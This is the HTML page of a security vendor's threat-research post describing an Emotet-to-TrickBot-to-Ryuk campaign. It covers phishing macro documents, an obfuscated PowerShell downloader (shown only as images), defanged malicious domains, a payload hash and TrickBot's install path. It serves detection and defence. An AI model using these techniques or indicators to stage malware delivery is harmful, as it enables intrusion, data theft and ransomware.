<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Cybereason Nocturnus">
    <meta name="description" content="The Cybereason team has uncovered a severe threat that adapts Emotet to drop TrickBot, and adapts TrickBot to not only steal data but also download the Ryuk ransomware. This attack steals personal information, passwords, mail files, browser data, and registry keys before ransoming the victims data. ">
    <meta name="generator" content="HubSpot">
    <title>Triple Threat: Emotet Deploys TrickBot to Steal Data &amp; Spread Ryuk</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/cr-favicon-1.png">
    
<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="The Cybereason team has uncovered a severe threat that adapts Emotet to drop TrickBot, and adapts TrickBot to not only steal data but also download the Ryuk ransomware. This attack steals personal information, passwords, mail files, browser data, and registry keys before ransoming the victims data. ">
    <meta property="og:title" content="Triple Threat: Emotet Deploys TrickBot to Steal Data &amp; Spread Ryuk">
    <meta name="twitter:description" content="The Cybereason team has uncovered a severe threat that adapts Emotet to drop TrickBot, and adapts TrickBot to not only steal data but also download the Ryuk ransomware. This attack steals personal information, passwords, mail files, browser data, and registry keys before ransoming the victims data. ">
    <meta name="twitter:title" content="Triple Threat: Emotet Deploys TrickBot to Steal Data &amp; Spread Ryuk">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41681847227/1644941386203/module_41681847227_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/41682410610/1644941443237/module_41682410610_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/43300360745/1724042214535/module_43300360745_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/1669911113479/module_86933076631_CR_-_Sticky_CTA_Bar.css">
<link rel="stylesheet" href="https://cdn2.hubspot.net/hub/3354902/hub_generated/module_assets/34473990280/1704383554067/module_34473990280_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TJVVB7C');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->


<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="preload" href="/hubfs/__dam/fonts/ionicons.eot" as="font" type="font/otf" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Medium.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/peristyle/Peristyle-Black.woff2" as="font" type="font/woff2" crossorigin>
<link rel="amphtml" href="https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/Emotet.png">
<meta property="og:image:alt" content="emotet, ryuk, and trickbot">
<meta name="twitter:image" content="https://www.cybereason.com/hubfs/Emotet.png">
<meta name="twitter:image:alt" content="emotet, ryuk, and trickbot">

<meta property="og:url" content="https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">
<meta name="twitter:card" content="summary">
<meta name="twitter:creator" content="@cr_nocturnus">

<link rel="canonical" href="https://www.cybereason.com/blog/research/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//7052064.fs1.hubspotusercontent-na1.net/hub/7052064/hub_generated/template_assets/1729622897632/hubspot/hubspot_default/shared/responsive/layout.min.css">


<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470223313/1696396395659/__CR_Web_Platform/CSS/cr-master__cta.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470477360/1710134689941/__CR_Web_Platform/CSS/cr-master__main.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/35275979682/1642096258129/__CR_Web_Platform/CSS/ionicons.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42760289143/1724041950600/__CR_Web_Platform/CSS/cr-mln__build.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/34470224480/1635957556830/__CR_Web_Platform/CSS/bulma/cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/35291999472/1696396871390/__CR_Web_Platform/CSS/bulma/cr-framework__bulma.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42363645447/1635957556555/__CR_Web_Platform/CSS/hamburger-animation.min.css">
<link rel="stylesheet" href="//cdn2.hubspot.net/hub/3354902/hub_generated/template_assets/42507091846/1635957557027/__CR_Web_Platform/CSS/animate.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'var(--cr-yellow)',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    <style>
.cr-mln__blog-post .container-is-blog.cr-mln__blog-post--body .column:nth-of-type(2) img {
    background: #FFFFFF;
    border: 1px solid #CCCCCC;
    border-radius: 5px 5px 5px 5px;
    padding: 10px;
} 
</style>

</head>
<body class="   hs-content-id-8556664580 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header" class="position-flex">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-black.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All Posts</span></a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-malicious-life-logo-v2.png"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="/blog/category/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">







<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">

    <div class="column is-8-fullhd is-8-desktop is-offset-2-fullhd is-offset-2-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/Emotet.png" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Triple Threat: Emotet Deploys TrickBot to Steal Data &amp; Spread Ryuk</span></h1>
      <div class="cr-mln__post-author-share">
      <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
        
          <span class="descriptor">Written By</span>
          <p><span class="author">Cybereason Nocturnus</span></p>
         
      </div>
    </div>
     
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-7-fullhd is-7-desktop is-10-tablet is-10-mobile is-offset-1-fullhd is-offset-1-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><h2 style="line-height: 1.75;">WHAT IS Ryuk RANSOMWARE</h2>
<p>Ryuk ransomware was first detected in <a href="https://www.cyber.nj.gov/threat-profiles/ransomware-variants/ryuk" rel=" noopener">August 2018</a> in targeted attacks through an unknown infection method. The ransomware scoped out a target, gained access via Remote Desktop Services or other direct methods, stole credentials, and then targeted high-profile data and servers to extort the highest ransom possible. By January 2019, an active campaign of the Ryuk ransomware was discovered targeting victims who were previously attacked by TrickBot. Another recently discovered campaign of Emotet-TrickBot-Ryuk was used to <a href="https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/" rel=" noopener">deploy and initiate the Ryuk ransomware</a>. That differs from the campaign mentioned in this research, as this campaign describes each phase of the attack in detail, as well as the use of TrickBot to steal sensitive information before deploying Ryuk to ransom victims data.</p>
<!--more--><h2>WHAT IS TRICKBOT</h2>
<p>Although trojans typically target individuals to steal bank account credentials, the TrickBot trojan was being used to deliver secondary malware in a similar way to what is detailed in this research. The difference from the campaign mentioned in this research is that as this campaign uses TrickBot to steal sensitive information, it also deploys Ryuk to ransom victims data. Criminals targeting large enterprises used spam emails to deliver the Emotet trojan in order to distribute the TrickBot malware. Once a machine is infected with the TrickBot malware, it begins to steal sensitive information and the criminal group tries to determine if the company is an industry target. If so, they deliver the Ryuk ransomware.</p>
<h2>WHAT IS EMOTET</h2>
<p>Emotet was discovered in 2014 and used as a trojan by threat actors to steal banking credentials. More recently, it has been used as a dropper of other sophisticated malware.<br>Emotet has introduced several advanced capabilities over the years using a modular structure that features multiple modules including an installation module, a banking module, and a DDoS module. Emotet’s main distribution method remains phishing emails, which use various social engineering techniques to fool a user into clicking a malicious link or downloading a malicious Microsoft Office file.</p>
<h2>Phase One: Emotet Downloads TrickBot</h2>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=1440&amp;name=workflow.png" width="1440" style="width: 1440px; margin: 0px auto; display: block;" alt="Emotet delivers Trickbot, which delivers Ryuk" srcset="https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=720&amp;name=workflow.png 720w, https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=1440&amp;name=workflow.png 1440w, https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=2160&amp;name=workflow.png 2160w, https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=2880&amp;name=workflow.png 2880w, https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=3600&amp;name=workflow.png 3600w, https://www.cybereason.com/hs-fs/hubfs/workflow.png?width=4320&amp;name=workflow.png 4320w" sizes="(max-width: 1440px) 100vw, 1440px"></div>
<p>&nbsp;</p>
<p style="text-align: center; font-size: 16px;"><em>Flow of the attack as Emotet delivers TrickBot, which delivers Ryuk. Workflow chart originally created by the Kryptos Logic team for their <a href="https://blog.kryptoslogic.com/malware/2019/01/10/dprk-emotet.html" rel=" noopener">blog on the same topic</a>.</em></p>
<p style="text-align: center;">The first stage of the attack starts with a weaponized Microsoft Office document attached to a phishing email. This file contains a malicious, macro-based code. Once the user opens the document, the malicious file will run cmd and execute a PowerShell command. The PowerShell command attempts to download the Emotet payload.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=836&amp;name=triple-threat-blog-1.png" alt="Macro-embedded Microsoft Word document" width="836" loading="lazy" style="width: 836px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=418&amp;name=triple-threat-blog-1.png 418w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=836&amp;name=triple-threat-blog-1.png 836w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=1254&amp;name=triple-threat-blog-1.png 1254w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=1672&amp;name=triple-threat-blog-1.png 1672w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=2090&amp;name=triple-threat-blog-1.png 2090w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-1.png?width=2508&amp;name=triple-threat-blog-1.png 2508w" sizes="(max-width: 836px) 100vw, 836px"></p>
<p style="text-align: center; font-size: 16px;"><em>Macro-embedded Microsoft Word document.</em></p>
<p><br>In recent attacks, Cybereason’s research team has spotted Emotet adapting in order to be used as a dropper for the TrickBot banking trojan. This is an expansion from its previous information-stealing capabilities.</p>
<p>The execution flow of Emotet starts within outlook.exe, where the phishing email was received. Following that, winword.exe opens the malicious attachment from the email and executes a cmd to run PowerShell. This command downloads and executes the Emotet payload.&nbsp;</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=484&amp;name=triple-threat-blog-2.png" alt="Emotet process tree" width="484" loading="lazy" style="width: 484px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=242&amp;name=triple-threat-blog-2.png 242w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=484&amp;name=triple-threat-blog-2.png 484w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=726&amp;name=triple-threat-blog-2.png 726w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=968&amp;name=triple-threat-blog-2.png 968w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=1210&amp;name=triple-threat-blog-2.png 1210w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-2.png?width=1452&amp;name=triple-threat-blog-2.png 1452w" sizes="(max-width: 484px) 100vw, 484px"></p>
<div><img src="https://lh3.googleusercontent.com/EgmP9daBMIEd7ZFnH9rB8JrKXhgC9KCWxG93iI71dPzFjCQ7csqCPD94OP7UK6BIhRbrNOnICXppBga6-IZhRHWntfkyh1fj5z2jAQBkIWJNHT-pkcL-w8b-iFl0ew8eidpS0VYA" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><span style="font-size: 16px;"><em>The Emotet process tree in the Cybereason Platform. </em></span></p>
<p>This cmd instance has an obfuscated command line.&nbsp;</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=638&amp;name=triple-threat-blog-3.png" alt="CMD Emotet dropper" width="638" loading="lazy" style="width: 638px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=319&amp;name=triple-threat-blog-3.png 319w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=638&amp;name=triple-threat-blog-3.png 638w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=957&amp;name=triple-threat-blog-3.png 957w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=1276&amp;name=triple-threat-blog-3.png 1276w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=1595&amp;name=triple-threat-blog-3.png 1595w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-3.png?width=1914&amp;name=triple-threat-blog-3.png 1914w" sizes="(max-width: 638px) 100vw, 638px"></p>
<div><img src="https://lh4.googleusercontent.com/ct4JtL-oQ814vDmN3Va1E_qa9EjU5piASn9hQKub5rYKUxvJuJNVPZ0-o9HcfeGK7dKNGUqgwWYG9Xi2xbIOli4Le5njFMprZtM3ekYWeVfQ_lLadhvKkPAGPpXBTzhPQLmvKq-h" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center; font-size: 16px;"><em>CMD Emotet dropper obfuscated command line.</em>&nbsp;</p>
<p>When deobfuscated in memory, the command line is translated into a Powershell script.</p>
<div><img src="https://lh4.googleusercontent.com/CKoJ59J7m2X_WdMvkd2VypbVlxV4o5aTrNbHtbobdaTXlnre01bipDgAKmfFiZax1DhDOjzx_-AvD8_FAknQSbnH_i7yqyrRbsEFl9AM5cBfsdw9sN2I3Zwa0XdxhBXnrQzw9pL0" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=666&amp;name=triple-threat-blog-4.png" alt="triple-threat-blog-4" width="666" loading="lazy" style="width: 666px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=333&amp;name=triple-threat-blog-4.png 333w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=666&amp;name=triple-threat-blog-4.png 666w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=999&amp;name=triple-threat-blog-4.png 999w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=1332&amp;name=triple-threat-blog-4.png 1332w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=1665&amp;name=triple-threat-blog-4.png 1665w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-4.png?width=1998&amp;name=triple-threat-blog-4.png 1998w" sizes="(max-width: 666px) 100vw, 666px"></em></p>
<p style="text-align: center; font-size: 16px;"><em>PowerShell Emotet dropper obfuscated command line.</em>&nbsp;</p>
<p>The PowerShell instance attempts to download the Emotet payload from different malicious domains after “building” the download URLs from multiple chunks. It names the payload 379.exe (<em>SHA1: B521fe7ff72e68165ff767d7dfa868e105d5de8b</em>) and executes it.</p>
<p>The PowerShell script attempts to download the Emotet payload from the following domains:</p>
<ul>
<li><span style="font-size: 18px;">efreedommaker[.]com</span></li>
<li><span style="font-size: 18px;">retro11legendblue[.]com</span></li>
<li><span style="font-size: 18px;">oussamatravel[.]com</span></li>
<li><span style="font-size: 18px;">cashcow[.]ai</span></li>
<li><span style="font-size: 18px;">shahdazma[.]com&nbsp;</span><br><br></li>
</ul>
<div><img src="https://lh6.googleusercontent.com/yekl3UbDLG76P0vjBTJBqw1rgWMX7gQGepnBC6e5uGeGcpwP9FeF7BXGdTuTtM-5wu6XFdEleS65FnAm72pDKH42wfxc5e4TVFibnYfaS2-1UXXU17UyxTdaRLEFSwPGgt8tl5TR" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center; font-size: 16px;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=1657&amp;name=triple-threat-blog-5.png" alt="connection to the C2 server to download the Emotet payload" width="1657" loading="lazy" style="width: 1657px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=829&amp;name=triple-threat-blog-5.png 829w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=1657&amp;name=triple-threat-blog-5.png 1657w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=2486&amp;name=triple-threat-blog-5.png 2486w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=3314&amp;name=triple-threat-blog-5.png 3314w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=4143&amp;name=triple-threat-blog-5.png 4143w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-5.png?width=4971&amp;name=triple-threat-blog-5.png 4971w" sizes="(max-width: 1657px) 100vw, 1657px"></em><em>The Cybereason Platform identifying the connection to the C2 server to download the Emotet payload.</em></p>
<p>When the Emotet payload executes, it looks to continue its malicious activity by further infecting and gathering information on the affected machine. It initiates the download and execution of the TrickBot trojan by communicating with and downloading from a pre-configured and remote malicious host.&nbsp;</p>
<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=411&amp;name=triple-threat-blog-6.png" alt="process tree of Emotet delivering TrickBot" width="411" loading="lazy" style="width: 411px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=206&amp;name=triple-threat-blog-6.png 206w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=411&amp;name=triple-threat-blog-6.png 411w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=617&amp;name=triple-threat-blog-6.png 617w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=822&amp;name=triple-threat-blog-6.png 822w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=1028&amp;name=triple-threat-blog-6.png 1028w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-6.png?width=1233&amp;name=triple-threat-blog-6.png 1233w" sizes="(max-width: 411px) 100vw, 411px"></div>
<p style="text-align: center; font-size: 16px;"><em>The process tree of Emotet delivering TrickBot as seen in the Cybereason Platform.</em></p>
<h2 style="line-height: 1.75;">Phase Two: Lateral Movement</h2>
<p>TrickBot is a modular trojan that unpacks itself in memory. It is often called a banking trojan, however, its modular structure allows it to freely add new functionalities outside of collecting banking data. Collecting bank data is just one of its many potential modules.&nbsp;</p>
<p>In previous iterations, TrickBot was fairly simple. However, it has been improved over the years to include extra modules advanced capabilities like password collecting and detection evasion.</p>
<p>When TrickBot executes, it creates an installation folder under <em>C:\user\AppData\Roaming\%Name%</em>, where %Name% is dependent on the bot version. This folder contains a copy of the malware with a slightly different name, a <em>settings.ini</em> file, and a <em>Data</em> folder.&nbsp;</p>
